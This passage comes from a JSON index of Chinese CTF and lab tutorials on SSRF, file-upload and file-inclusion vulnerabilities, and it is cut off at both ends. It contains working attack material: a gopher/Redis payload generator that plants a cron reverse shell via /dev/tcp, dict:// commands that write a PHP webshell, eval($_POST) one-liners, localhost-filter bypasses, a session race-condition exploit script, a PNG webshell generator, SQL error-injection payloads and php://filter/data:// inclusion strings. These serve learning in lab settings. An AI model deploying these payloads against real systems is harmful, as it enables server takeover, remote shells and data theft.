urllib\nprotocol=\"gopher://\"\nreverse_ip=\"192.168.134.132\"\nreverse_port=\"1234\"\nfilename=\"root\"\ncron=\"\\n\\n\\n\\n*/1 * * * * bash -i >&amp; /dev/tcp/%s/%s 0>&amp;1\\n\\n\\n\\n\"%(reverse_ip,reverse_port)\npath=\"/var/spool/cron\"\npasswd=\"\"\ncmd=[\"flushall\",\n     \"set 1 &#123;&#125;\".format(cron.replace(\" \",\"$&#123;IFS&#125;\")),\n     \"config set dir &#123;&#125;\".format(path),\n     \"config set dbfilename &#123;&#125;\".format(filename),\n     \"save\"\n     ]\nif passwd:\n    cmd.insert(0,\"AUTH &#123;&#125;\".format(passwd))\npayload=protocol+reverse_ip+\":\"+reverse_port+\"/_\"\ndef redis_format(arr):\n    CRLF=\"\\r\\n\"\n    redis_arr = arr.split(\" \")\n    cmd=\"\"\n    cmd+=\"*\"+str(len(redis_arr))\n    for x in redis_arr:\n        cmd+=CRLF+\"$\"+str(len((x.replace(\"$&#123;IFS&#125;\",\" \"))))+CRLF+x.replace(\"$&#123;IFS&#125;\",\" \")\n    cmd+=CRLF\n    return cmd\n\nif __name__==\"__main__\":\n    for x in cmd:\n        payload += urllib.quote(redis_format(x))\n    print payload\n运行后得到在攻击机上进行监听，同时克隆一个终端进行curl +payload\n之后即可成功反弹shell\n靶场实战SSRF-lab环境搭建1、从github上下载靶场代码如下\ngit clone https://gitclone.com/github.com/m6a-UdS/ssrf-lab.git\n2、切换到靶场路径下制作镜像\ncd /ssrf-lab/basics\nsudo docker build -t ssrf-lab/basic .\n3、运行镜像并映射到80端口\ndocker run -d -p 80:80 ssrf-lab/basic\n4、进入容器中配置Redis\ndocker exec -it 容器id /bin/bash\napt-get install redis-server\n5、开启Redis服务\nredis-server\n访问\n收集信息先测127.0.0.1发现有回显，说明对ip没有限制，此时尝试读取文件\nfile:///etc/passwd\n\n获取到密码，此时再用dict伪协议读取redis信息\ndict://127.0.0.1:6379/info\n\n构造webshell此时我们是没有shell.php的，我们尝试写入一个shell.php\ndict://127.0.0.1:6379/config:set:dir/var/www/html //设置目录\n\n\ndict://127.0.0.1:6379/set:shell:\"&lt;?php eval($_POST[1])?>\" //设置文件内容\n发现未成功，尝试十六进制绕过\ndict://127.0.0.1:6379/set:shell:\"\\x3c\\x3f\\x70\\x68\\x70\\x20\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x31\\x5d\\x29\\x3f\\x3e\"\n\ndict://127.0.0.1:6379/config:set:dbfilename:shell.php //设置文件名\n\n\ndict://127.0.0.1:6379/save //保存\n去靶机中查看成功写入\n靶场实战URL and IP PASS0X01&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https')&#123;\nif(!preg_match('/localhost|127.0.0/'))&#123;\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n&#125;\nelse&#123;\n    die('hacker');\n&#125;\n&#125;\nelse&#123;\n    die('hacker');\n&#125;\n可以发现这个多了parse_url函数，这个函数的作用如下\nparse_url — 解析 URL，返回其组成部分\n示例如下\n&lt;?php\n$url = 'http://username:password@hostname/path?arg=value#anchor';\n\nprint_r(parse_url($url));\n\necho parse_url($url, PHP_URL_PATH);\n?> \n输出结果\nArray\n(\n    [scheme] => http\n    [host] => hostname\n    [user] => username\n    [pass] => password\n    [path] => /path\n    [query] => arg=value\n    [fragment] => anchor\n)\n/path\n这里的话就是要求是http或者https，然后呢不能出现loca1host或者127.0.0，仔细看的话，会发现这里是loca1而非local，同时127.0.0防不了127.0.0.1，因此是可以沿用上关思路的，不过这里的考点是这个127.0.0.1的绕过，这里给出几个payload\n//特殊0\nurl=http://0/flag.php\nurl=http://0.0.0/flag.php\n//进制绕过\nurl=http://0177.0.0.1/flag.php //八进制\nurl=http://0x7f.0.0.1/flag.php //十六进制\nurl=http://2130706433/flag.php  //十进制\n0X02&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https')&#123;\n$host=$x['host'];\nif((strlen($host)&lt;=5))&#123;\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n&#125;\nelse&#123;\n    die('hacker');\n&#125;\n&#125;\nelse&#123;\n    die('hacker');\n&#125;\n这个的话要求host长度小于5，这个时候127.0.0.1和localhost都是不符合要求的，这个时候我们可以用特殊0来替代\nurl=http://0/flag.php\n还有一个，127.1也是可行的\n0X03&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https')&#123;\n$ip = gethostbyname($x['host']);\necho '&lt;/br>'.$ip.'&lt;/br>';\nif(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;\n    die('ip!');\n&#125;\n\n\necho file_get_contents($_POST['url']);\n&#125;\nelse&#123;\n    die('scheme');\n&#125;\n?>\n\nFILTER_VALIDATE_IP 要求值是合法的 IP\nFILTER_FLAG_NO_PRIV_RANGE 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）\nFILTER_FLAG_NO_RES_RANGE 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。\n这里的话其实就是要求用一个公网ip，不能用私网ip这里的话可以用https://lock.cmpxchg8b.com/rebinder.html来构造DNS重绑定然后作为host赋值给url即可\n0X04&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif(preg_match('/^http:\\/\\/ctf\\..*show$/i',$url))&#123;\n    echo file_get_contents($url);\n&#125;\n可以看到的话就是这里要求http开头，中间是.ctf，然后中间可以写内容，最后以show结尾这个时候我们就可以利用刚刚的思路，来构造url\nurl=http://ctf.@127.0.0.1/flag.php#show\n\n\nGopher协议实战\n\n\n\n\n\n\n\n\n打无密码的mysql\n进入靶场是一个登录界面\n提示了是无密码的mysql，那就尝试利用gopher工具来打\npython2 gopherus.py --exploit mysql\n用户名为root，内容为一句话木马即可而后我们看这道题源代码中的returl应该就是突破口，我们随便输入一个进入check.php界面，此时将刚刚得到的payload进行url编码后赋值给returl即可,此时访问1.php\n绝对路径写webshell实战题目提示\n\n\n\n\n\n\n\n\n\n打redis\n代码\n&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n?>\n提示了打redis，那思路就比较明显了，可以利用工具打然后直接赋值，这里手动操作一下\n设置本地数据库存放目录写一句话木马但此时的回显不是ok，说明可能被过滤了，这里换成十六进制绕过设置文件名访问获取flag\n参考文献《从0到1 CTFer成长之路》https://xz.aliyun.com/t/7333#toc-0https://xz.aliyun.com/t/5665#toc-0https://cloud.tencent.com/developer/article/1437452https://www.cnblogs.com/wjrblogs/p/14456190.htmlhttps://www.cnblogs.com/bmjoker/p/9548962.htmlhttps://www.freebuf.com/articles/web/333318.htmlSSRF-Lab环境搭建\n","slug":"从一文了解SSRF的各种绕过姿势及攻击思路","date":"2022-07-04T04:04:10.000Z","categories_index":"WEB知识","tags_index":"SSRF","author_index":"quan9i"},{"id":"59889abed1e0595b2f38848b74044672","title":"浅析文件上传","content":"前言文件上传与文件包含这种漏洞都是比较常见的漏洞，在学习过后对其进行简单总结，希望能对正在学习此部分的师傅们有一些帮助。\n漏洞相关信息漏洞定义文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传” 本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。\n漏洞危害网站被控制，对文件增删改查，执行命令，链接数据库如果服务器长久未更新，可以利用exp提权，导致服务器沦陷同服务器的其他网站沦陷漏洞常见利用方法1、修改限制的后缀名(前端js检测时可直接在浏览器中修改)\n2、修改文件头绕过，即修改content-type与要求后缀一致(检测文件头时，即后端设置检测时)\n3、修改.user.ini配置文件(当存在index.php文件时)\n4、构造GIF89A添加到文件绕过图片检测（检测文件内容时）\n5、修改.htaccess绕过(中间件解析漏洞）\n5、%00截断绕过后缀检测\n6、利用条件竞争绕过\n7、二次渲染绕过\n漏洞常用知识1、一些黑名单被过滤时的替代方法\n&lt;1&gt;在上传文件时，有时候php可能被过滤，而php文件的的格式是&lt;?php ?&gt;，因此这里的话我们可以用短标签=来进行替代，或者有时候可以用大小写或者双写(例如：phphpp)，从而实现绕过。\n&lt;2&gt;在上传文件时，有时候会上传日志文件，当过滤var这种的时候，我们可以用.来进行绕过，即构造log为lo’.’g\n&lt;3&gt;在写文件内容时，有时候会被过滤空格，这时候我们有以下几种绕过方法\n/**/\n%09(php环境)\n$&#123;IFS&#125;\n//加$是为了隔断，IFS是shell已经定好的，功能就是分隔变量，默认就是对字段起分隔作用\n$IFS$9\n\n2、中间件解析漏洞\n&lt;1&gt;apache解析漏洞\n（1）Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断\n举个栗子\n当我们输入文件名为1.php.rar时，由于apache不识别解析rar文件，因此这里就等同于上传的文件名为1.php，但我们访问的话仍是1.php.rar，访问这个文件就可以发现我们上传文件成功\n(2)Apache中的.htaccess文件\n.htaccess的定义\n概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n我们这里的话利用的就是改变文件拓展名\n在这里的话它的含义就是将其他文件解析为php给执行，内容修改后大致是这样\nAddType application/x-httpd-php .jpg\n\n&lt;2&gt;IIS解析漏洞\n(1)文件解析漏洞(5.x-6.0版本)\n举个栗子\n我们上传1.asp;.jpg，此时也可能会出现匹配最后.后面的后缀的情况，从而认为上传的文件是jpg，但IIS不看分号后的内容，所以它理解的文件名其实就是1.asp\n(2)目录解析漏洞(5.x-6.0的版本)\n依旧用栗子来说明\n例如/123.asp/ddd.jpg，网站限制了上传文件的格式（只能jpg）在123.asp路径下的文件(如ddd.jpg)都会以asp文件解析\n&lt;3&gt;Nginx解析漏洞\n（1）Nginx中php配置错误导致的解析漏洞\n再举个栗子\n当我们构造一个文件，假如名字是test.jpg，写入内容为，此时我们访问test.jpg，其返回的是图片存在问题，无法显示，而当我们此时访问test.jpg/test.php时，回显”Access denied”，这个test.jpg不是目录，而且test.php更是一个都不存在的文件，此时却回显了访问被拒绝，这是为什么呢，因为这时Nginx会认为这是php文件，转交给php来处理，而php发现这个test.php文件不存在，就会删去test.php，此时就会访问test.jpg，php认为它不是php文件，就回显了拒绝访问。而当我们将配/etc/php5/fpm/php-fpm.conf文件中的security.limit_extensions添加上.jpg时就会回显出php配置信息\n(2)%00截断\n前提\nphp版本小于5.3.29magic_quotes_gpc = Off它的原理简单的来说就是url中的%00表示ascii码中的0，而ascii码中的0表示的就是字符串结束，不再往后面读取，此时就实现了截断的目的\n举个栗子\n假设此时我们想上传php文件，但允许上传的是jpg文件，我们此时就可以借助%00截断来实现\nfilename=1.jpg                                此时上传的是1.jpg\n加上%00\nfilename=1.php%00.jpg                此时上传的是1.php（突破限制）\n实战修改后缀名绕过（前端修改js代码)进入靶场，选择开发者模式，发现了允许格式，我们点击修改将png修改为php此时上传我们的木马文件\n&lt;?php\nvar_dump(\"包含成功\");//方便查看是否成功包含\n@eval($_POST[1]);\n?>\n\n此时就可以执行我们想要执行的语句了，首先查看根目录，构造payload如下\n1=system(\"ls /\");\n这个目录没有，去上个目录进行查看\n1=system(\"ls ../\");\n找到flag，查看文件，构造payload如下\n1=system(\"tac ../flag.php\");\n\n\n修改文件头绕过我们发现修改前端上传php已经不行了可能是后端检验了文件内容类型，我们bp抓包修改文件类型再进行尝试\n成功上传，访问蚁剑连接得到flag\n修改.user.ini配置文件绕过0X01上传.user.ini文件添加文件包含功能,首先我们需要修改js代码，删去限制文件后缀，修改accept为file然后呢，我们上传.user.ini进行抓包\n上传成功，此时再传我们的txt文件\n将错误复制到浏览器中查看错误具体回显信息文件内容不合规，说明里面有过滤，一一排除后发现是php的问题，说明后端过滤了php但是报出了语法错误，说明这个php需要修改，修改大小写的话服务器不解析，不行，因此我们这里用短标签=来绕过查看url/upload/index.php\n获取flag\n1=system(\"tac ../f*.php\");\n\n0X02同之前写入.user.ini文件，但此时发现利用短标签也无法进行绕过进行排查，先将中间内容修改为1试试上传成功，说明里面有东西被过滤掉了一一排查后发现是[]被ban了，这个[]可以用&#123;&#125;来进行绕过查看文件获取flag\n1=system(\"tac ../flag.php\");?> \n\n\n0X03（.user.ini配置文件结合日志包含）思路是.user.ini包含一个文件，然后让这个文件包含日志文件，但经过检测后发现过滤了空格，我们这里本来打算采取%09进行绕过，但是在界面上会报错，因此我们这里用/**/来代替空格，构造payload如下\n&lt;?=include/**/'/var/l'.'og/nginx/access.lo'.'g'?>\n然后访问url/1.txt,修改UA为一句话木马此时本来应该是404的，但是由于后端设置的原因，所以这里回到了靶场最初的位置此时我们访问url/upload/,post随便上传一个验证是否成功上传蚁剑连接成功拿到flag\n修改文件内容绕过我们构造jpg文件传入一句话木马的话，&lt;会被识别出来而无法上传我们尝试构造pthml文件，pthml文件指的是嵌入html的php文件，这里我们可以发现仍然不行，可能对文件头进行了检查那我们这里呢，就构造pthml文件，这样标签就不会被过滤，也就可以绕过构造payload如下GIF89A&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);phpinfo();&lt;/script&gt;(GIF89A是构造一个图片头文件欺骗)查看这个文件，盲猜文件存放位置为upload下\n此时蚁剑连接获取webshell即可此时寻找flag即可\n中间件解析漏洞提示了httpd，httpd-apache2服务器上传.htaccess文件 ,对于此类文件的解释\n概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n在这里的话它的含义就是将任意jpg文件解析为php给执行,参考文章https://blog.csdn.net/frankarmstrong/article/details/72235206首先上传.htaccess文件此时再传图片马进行访问\n获取flag\n%00截断这里直接采取对源码进行分析，来更清晰的讲解%00截断\n源码如下\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit']))&#123;\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr))&#123;\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path))&#123;\n            $is_upload = true;\n        &#125; else &#123;\n            $msg = '上传出错！';\n        &#125;\n    &#125; else&#123;\n        $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n    &#125;\n&#125;\n这句话 $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;我们可以看出来是以get方式得到的文件上传路径，因此我们这里让在他get的路径后加上%00，此时的语句就相当于 $img_path = $_GET[&#39;save_path&#39;]，此时的路径也就是这个get设置的路径，后面的都不再看了，随便上传个jpg即可，内容写为一句话木马\n此时上传的路径就相当于被我们指定为upload/1.php，他的重塑和后缀名都被%00给截断了\n访问即可看见文件执行成功\n条件竞争绕过(结合.user.ini配置文件的修改)检测过后发现过滤了点.，此时的思路的话就是利用文件包含，我们先上传一个.user.ini文件，上传一个无后缀的文件，再让这个文件包含我们的session文件，此时用脚本进行文件竞争即可上传.user.ini文件包含一个文件\n上传文件包含session文件\nGIF89a\n&lt;?=include\"/tmp/sess_quan9i\"?>\n此时利用脚本(这里没有写入文件的原因是每次加载php文件都会刷新.user.ini文件，而.user.ini文件包含了22这个文件，那么此时就相当于把22这个文件给写入到了这里面)\nimport requests\nimport threading\nsession=requests.session()\nsessionid='quan9i'\nurl1=\"http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/\"\nurl2=\"http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload\"\ndata1=&#123;\n\t'PHP_SESSION_UPLOAD_PROGRESS':'&lt;?php system(\"tac ../f*\");?>'\n&#125;\nfile=&#123;\n\t'file':sessionid//指定写入的文件路径为/tmp/sess_quan9i\n&#125;\ncookies=&#123;\n\t'PHPSESSID': sessionid//指定session文件存储的路径是/tmp/sess_quan9i\n&#125;\n\ndef write():\n\twhile True:\n\t\tr = session.post(url1,data=data1,files=file,cookies=cookies)\ndef read():\n\twhile True:\n\t\tr = session.get(url2)\n\t\tif 'flag' in r.text:\n\t\t\tprint(r.text)\n\t\t\t\nthreads = [threading.Thread(target=write),\n       threading.Thread(target=read)]\nfor t in threads:\n\tt.start()\n\n二次渲染绕我们发现.user.ini无法上传，但是单纯的png格式的图片是可以上传的，这里可能涉及到了文件的二次渲染，文件渲染一般都会涉及imagecreatefromjpeg 函数，当出现这个函数的时候，那么普通的图片马都会被过滤掉，函数介绍如下\nimagecreatefromjpeg — 由文件或 URL 创建一个新图象。\nimagecreatefromjpeg(  $filename)\n返回一图像标识符，代表了从给定的文件名取得的图像。\n这里我们引用其他师傅的脚本来创建一个图片马，这个图片马会自动写入木马文件并且保证木马不会被二次渲染所影响\n&lt;?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n           0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;\n   $r = $p[$y];\n   $g = $p[$y+1];\n   $b = $p[$y+2];\n   $color = imagecolorallocate($img, $r, $g, $b);\n   imagesetpixel($img, round($y / 3), 0, $color);\n&#125;\n\nimagepng($img,'./1.png');\n?>\n\n运行这个php文件后即会在当前目录出现一个1.png文件，我们可以用记事本来查看一下文件的内容可以发现木马文件存在其中，将这个文件上传post抓包后进行修改数据，这里先介绍一个call_user_func函数\ncall_user_func — 把第一个参数作为回调函数调用\nmixed call_user_func( callable $callback)\ncallback\n将被调用的回调函数（callable）。 \nparameter\n0个或以上的参数，被传入回调函数。 \n\n这个玩意可以检测一下是否可以执行(其实没啥必要，这里就是学习学习函数)，输入payload如下\nurl&amp;0=call_user_func\n1=phpinfo\n\n然后发现可以执行，此时我们查看当前目录\n&amp;0=system\n1=ls ./\n获取flag\nurl&amp;0=system\n1=tac f*\n\n\n题型新颖的文件上传与反弹shell结合的文件上传（MRCTF签到）发现是一道文件上传的题目，我们选择文件进行上传并且抓包，而后发现只有php文件可以上传，其他文件都是无法上传的，因此的话中间件解析漏洞和图片马就没法使用了，而后经过测试，我们发现这个system函数直接执行语句也是不行此时我们想构造一句话木马发现一句话木马传不进去，post里面不放数字的时候可以这里尝试phpinfo()也会报错尝试伪协议，也无法进行绕过此时我们尝试包含日志文件结果依旧还是不行此时的话还有就是类似于变量拼接的那种，先把值赋给一个变量，再执行这个变量将结果给另一个变量，再将这个输出，具体如下\n至于为什么要用这种形式，而不是直接eval ($a)，这只是因为直接上传的时候会报错而我们知道eval函数的执行方式还可以这样运用eval(&quot;return $a;&quot;);,因此我们这里的话就可以尝试这样来进行\n此时的话你会发现这个可以输出，那我们把数字运算，改成post1，不就也可以传上去了吗，尝试一下\n&lt;?php\n$b=eval(\" return $a\");\necho $b;\n\n但此时你去上传phpinfo()发现什么也没有，这是为什么呢，因为我们的语句，那个post1是单引号，它是不解析的，因为不解析，所以返回的是字符串，所以输出是空，那怎么样才能让他输出呢，我们再加一个eval给它试试我们如果想让他解析，就需要改为双引号，或者是把echo $b 修改为eval $b，也就是上图此时就构造出来了，因此我们传入的一句话木马就是\n&lt;?php\n$b=eval(\" return $a\");\neval $b;\n或者\n&lt;?php\n$b=eval(\" return $a\");\neval $b;\n此时我们进行查找\n进行蚁剑连接后也只有这样，而此时你再看题给有hint找不到flag为正常情况此时就可能需要提权了，我们此时是个低权限用户，变成root用户才行，此时反弹shell服务器也找不到内核具体版本，从而找不到类似的提权办法，利用常见的脏牛发现也不行，此时在index.php文件下进行ls-al查看一下权限发现index.php本身是个root权限，此时我们知道这个php文件传入的时候是root权限，那我们直接利用php文件进行反弹shell到服务器，服务器开启监听，这时候就可以得到root权限看起来504，但是其实他在这个过程中已经执行了语句执行查找flag语句\ngrep -r \"MRCTF&#123;\" /var\n\n\n结合SQL注入的文件上传（网刃杯upload）此时就可以看见是文件上传，同时提示了sql yyds，说明可能和sql注入存在某种联系，此时我们打开环境随便上传一个文件此时的话就抓包修改content-type为ctf查看这个文件你会发现他不进行解析而且你会发现，他对每个上传成功的文件进行了重命名，因此那个利用apache解析漏洞修改.htacess文件的方法就失效了，因为前面加有东西的话，这个就无效了，此时我们图片马也就不用想了，试试phtml这个\n依然是不解析此时的话我们想一下开头就提到了那个sql yyds ，我们去百度一下后会发现真的有文件上传+sql注入的这种题存在简单了解过后，发现这些都是在文件名处进行注入，因此我们尝试把文件名当成注入点进行尝试，sql注入一般都是单引号或者啥的闭合，我们先让文件名来个1&#39;试试报错了，你会发现1’后面是’)，那这不就说明闭合方式是’)了，我们尝试给它闭合住，构造payload如下\n1'or 1=1 )#\n此时尝试进行联合查询发现报错了，猜测可能是字段数的问题，但是修改后还是报错，emm，那我此时看着报错，想着为啥不用报错注入呢，这里用报错注入尝试一下\n-1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)) #\n爆出了数据库名，这里我们再尝试爆表\n-1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='upload'),0x7e),1)) #\n\n此时报错了但未爆出表名，你看上面的sql语句，会发现少了个东西，select table_name from information_schema这个查表的语句没有出现在这里，前面变成了一串字符串，说明这里查表语句被过滤了，那我们这里的话应该是还有其他方法可以获取表名的，不过我这里想试试盲猜(太菜，其他不会，只能死马当做活马医)，我猜flag位于flag列，进行尝试，\n-1' and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)) #\n擦，还真有，那我们随便用个截取函数，截取后半部分两者结合一下，就可以得到flagflag&#123;5937a0b90b5966939cccd369291c68aa&#125;\n尾记博主是一个小白，可能在多方面存在问题，在做过ctf赛题后也是深感到自己知识的匮乏，总结的多有不当，有问题还请各位师傅多多指教！！！\n参考文章https://www.cnblogs.com/Linkas/p/15115240.htmlhttps://blog.csdn.net/frankarmstrong/article/details/72235206https://www.php.cn/php-weizijiaocheng-415762.htmlhttps://www.freebuf.com/vuls/279171.htmlhttps://blog.csdn.net/qq_26090065/article/details/81458937https://www.jianshu.com/p/71b8b554d9b3https://blog.csdn.net/qq_37133717/article/details/94590122https://blog.csdn.net/qq_32434307/article/details/79480036https://blog.csdn.net/frankarmstrong/article/details/72235206ttps://blog.csdn.net/weixin_45588247/article/details/119652017https://www.freebuf.com/articles/web/328985.htmlhttps://blog.csdn.net/qq_38684504/article/details/90047213https://www.freebuf.com/articles/web/247967.htmlhttps://blog.csdn.net/haha13l4/article/details/96913574https://blog.csdn.net/weixin_46137328/article前言\n","slug":"浅析文件上传","date":"2022-06-18T09:25:28.000Z","categories_index":"WEB知识","tags_index":"文件上传","author_index":"quan9i"},{"id":"778d53d2750c08bc5c3164d03f2d66cf","title":"浅析文件包含","content":"前言近期发现文件包含这方面几乎一窍不通，特来对此漏洞进行学习，并总结如下，希望能对正在学习文件包含的人有些许帮助。\n漏洞相关信息漏洞成因后端编程人员一般会把重复使用的函数写到单个文件中，需要使用时再直接调用此文件即可，该过程也就\n被称为文件包含。文件包含的存在使得开发变得更加灵活和方便，但同时也带了安全问题，导致客户端\n可以远程调用文件，造成文件包含漏洞。这个漏洞在php中十分常见，其他语言也有。\n漏洞危害文件包含漏洞可能带来的危害有：\n1、web服务器的文件被外界浏览，导致信息泄露；\n2、脚本被任意执行，导致网站被篡改。文件包含漏洞是一种常见的依赖于脚本运行而影响web应用程序\n的漏洞。\n漏洞分类1.本地文件包含漏洞本地的话简单理解就是网页本身存在着恶意文件，我们对其进行调用，从而获取信息等\n2.远程文件包含漏洞（需要php.ini开启了allow_url_fopen和allow_url_include）远程简单理解就是网页本身不存在恶意文件，我们取别的地方的文件包含进去，包含的文件是第三方服务器的文件。\n漏洞常用函数主流文件包含php一些函数的含义：\n\ninclude() :执行到include()才包含文件，找不到包含文件只产生警告，还会接着运行后面的脚本\n\nrequire(): 只要程序一运行就会包含文件，找不到包含文件则会报错，并且脚本终止运行\n\ninclude_once():执行到include()才包含文件，找不到包含文件只产生警告，还会接着运行后面的脚本\n_once()后缀表明只会包含一次，已包含则不会再包含\nrequire_once()：只要程序一运行就会包含文件，找不到包含文件则会报错，并且脚本终止运行\n_once()后缀表明只会包含一次，已包含则不会再包含\n\n利用方法最常用的是伪协议\nfile:// 协议：\n        条件 allow_url_fopen:off/on  allow_url_include :off/on\n        作用：用于访问本地文件系统。在include()/require()等参数可控的情况下\n             如果导入非php文件也会被解析为php\n        用法：\n            1.file://[文件的绝对路径和文件名]\n            2.[文件的相对路径和文件名]\n            3.[http：//网络路径和文件名]\n\nphp:// 协议：\n        常见形式：php://input php://stdin php://memory php://temp\n        条件 allow_url_include需要 on allow_url_fopen:off/on\n        作用：php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter\n            和php://input，php://filter用于读取源码，php://input用于执行php代码\n        php://filter参数详解：resource=（必选，指定了你要筛选过滤的数据流）     \n        read=（可选）    write=（可选）\n        对read和write，可选过滤器有string.rot13、string.toupper\n        、string.tolower、string.strip_tags、convert.base64-encode \n        &amp; convert.base64-decode\n         用法举例：php://filter/read=convert.base64-encode/resource=flag.php\n                    网址+?page=php://filter/convert.base64-encode/resource=文件名\n\nzip:// bzip2:// zlib:// 协议：\n        条件：allow_url_fopen:off/on      allow_url_include :off/on\n        作用：zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件\n            更重要的是不需要指定后缀名\n        用法：zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]\n             compress.bzip2://file.bz2\n             compress.zlib://file.gz\n        其中phar://和zip://类似\n\ndata:// 协议：\n        条件：allow_url_fopen:on    allow_url_include :on\n        作用：可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。\n        用法：data://text/plain,            data://text/plain;base64,\n        举例：data://text/plain,&lt;?php%20phpinfo();?>\n             data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n其次还有条件竞争\n条件竞争就是两个或者多个进程或者线程同时处理一个资源（全局变量，文件）产生非预想的执行效果，从而产生程序执行流的改变，从而达到攻击的目的。\n条件竞争需要如下的条件：\n并发，即至少存在两个并发执行流。这里的执行流包括线程，进程，任务等级别的执行流。\n共享对象，即多个并发流会访问同一对象。常见的共享对象有共享内存，文件系统，信号。一般来说，这些共享对象是用来使得多个程序执行流相互交流。此外，我们称访问共享对象的代码为临界区。在正常写代码时，这部分应该加锁。\n改变对象，即至少有一个控制流会改变竞争对象的状态。因为如果程序只是对对象进行读操作，那么并不会产生条件竞争。\n\n实战无限制本地包含实战&lt;?php\n\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    include($file);\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125; \n\n我将flag放到上一级目录下此时我们访问网站想要得到flag只需构造如下payload即可\n?file=../flag\n执行结果\n有后缀的本地包含实战&lt;?php\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    include $file.'.php';\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n此时我们可以发现代码强行给变量加了一个.php后缀，而我们的flag没有.php后缀，我们想要进行获取flag的话就不能够让.php发挥作用，因此我们此时可以通过以下几种方法来对其进行截断（ 需要 magic_quotes_gpc=off，PHP小于5.3.4）\n%00截断\n\n路径长度截断\n# Linux 需要文件名长于 4096，Windows 需要长于 256\n\n点号截断\n# 只适用 Windows，点号需要长于 256\n具体如下\n文件包含实战(简单)0X01&lt;?php\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    include($file);\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n\n构造payload如下即可\n?file=php://filter/read=convert.base64-encode/resource=flag.php\n0X02&lt;?php\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    include($file);\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n过滤了php，我们可以用data伪协议\n?file=data://text/plain,&lt;?= `tac f*`?>\n0X03&lt;?php\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    $file = 